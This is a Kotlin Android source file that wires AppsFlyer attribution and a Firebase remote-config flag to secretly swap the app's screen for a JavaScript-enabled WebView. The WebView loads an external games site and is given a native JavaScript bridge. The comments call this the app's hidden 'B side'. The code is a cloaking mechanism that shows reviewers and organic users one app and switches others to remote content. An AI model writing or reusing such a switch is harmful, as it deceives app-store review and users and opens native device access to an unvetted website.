package com.fs.core

import android.app.Activity
import android.app.Application
import android.content.Intent
import android.util.Log
import android.webkit.WebChromeClient
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.fs.core.utils.SpUitl
import com.google.firebase.Firebase
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.remoteConfig
import com.google.firebase.remoteconfig.remoteConfigSettings


/**
 * 1.要求 appliccatioin初始化调用
 * 2.实现归因，归因标志写入本地
 * 3.actiity调用传入
 * 4.webview实现 jsInterface
 */

object Advantage {


    private var target = "google"

    private val url by lazy {
        "https://www.afun.games/?ch=$target"
    }

    const val TAG = "SF"
    var toggleByAF = false
    var afKey = ""
    var isFlutter = false
    var source = ""

    fun init(app: Application, key: String, flag: String) {
        target = flag
        afKey = key
        app.registerActivityLifecycleCallbacks(LifecycleCallback)
    }

    private fun initAF(activity: Activity) {

        val conversionListener = object : AppsFlyerConversionListener {
            override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {

                //前后台切换会二次归因，对比内存的渠道，如果一致，就不继续
                val str = data?.get("af_status").toString()
                if (source.isNotEmpty() && source == str) {
                    return
                }
                source = str
                Log.d(TAG, "from :$str")
                if (!str.isNullOrEmpty() && !str.equals("organic", true)) {

                    if (toggleByAF) {
                        LifecycleCallback.activity?.get()?.let {
                            activity.runOnUiThread {
                                if (isFlutter) {
                                    it.startActivity(Intent(it, PrivacyActivity::class.java))
                                    it.finish()
                                } else {
                                    initView(activity)
                                }
                            }
                        }
                    }
                }

            }

            override fun onConversionDataFail(p0: String?) {
            }

            override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {
            }

            override fun onAttributionFailure(p0: String?) {
            }

        }
//        AppsFlyerLib.getInstance().setDebugLog(true)
        AppsFlyerLib.getInstance().init(afKey, conversionListener, activity.applicationContext)
        AppsFlyerLib.getInstance().setMinTimeBetweenSessions(0)
        AppsFlyerLib.getInstance().start(activity.applicationContext)

    }

    private fun initFirebase(activity: Activity) {
        val remoteConfig: FirebaseRemoteConfig = Firebase.remoteConfig
        val configSettings = remoteConfigSettings {
            minimumFetchIntervalInSeconds = 60
        }
        remoteConfig.setConfigSettingsAsync(configSettings)
        remoteConfig.fetchAndActivate().addOnCompleteListener(activity) { task ->
            if (task.isSuccessful) {
                val updated = task.result

                Log.d(TAG, "Config params updated: $updated")
                if (updated) {
                    val toggle = remoteConfig.getBoolean("chock")

                    SpUitl.setToggle(activity, toggle)
                    Log.d(TAG, "toggle: $toggle")
                }

            } else {
                Log.d(TAG, "Fetch failed")
            }

            if (SpUitl.getToggle(activity)) {
                activity.runOnUiThread {
                    if (isFlutter) {
                        activity.startActivity(Intent(activity, PrivacyActivity::class.java))
                        activity.finish()
                    } else {
                        initView(activity)
                    }

                }
            }

        }


    }


    fun activityInit(activity: Activity, byAF: Boolean = false, isFlutter: Boolean = false) {
        //初始化重置，解决温启动不出b面的逻辑判断问题
        source=""
        toggleByAF = byAF
        this.isFlutter = isFlutter
        if (!byAF) {
            initFirebase(activity)
        }

        initAF(activity)

    }

    fun initView(activity: Activity) {

        val webView = WebView(activity)
        val setting: WebSettings = webView.settings
        setting.javaScriptEnabled = true
        setting.javaScriptCanOpenWindowsAutomatically = true
        setting.setSupportMultipleWindows(true)
        setting.domStorageEnabled = true
        setting.cacheMode = WebSettings.LOAD_DEFAULT
        setting.allowContentAccess = true
        setting.databaseEnabled = true
        webView.webChromeClient = WebChromeClient()
        webView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                return false
            }
        }
        webView.addJavascriptInterface(JsBridge(activity), "jsThirdBridge")
        webView.loadUrl(url)
        activity.setContentView(webView)
        Log.d(TAG, "wv init and load :$url")
    }

}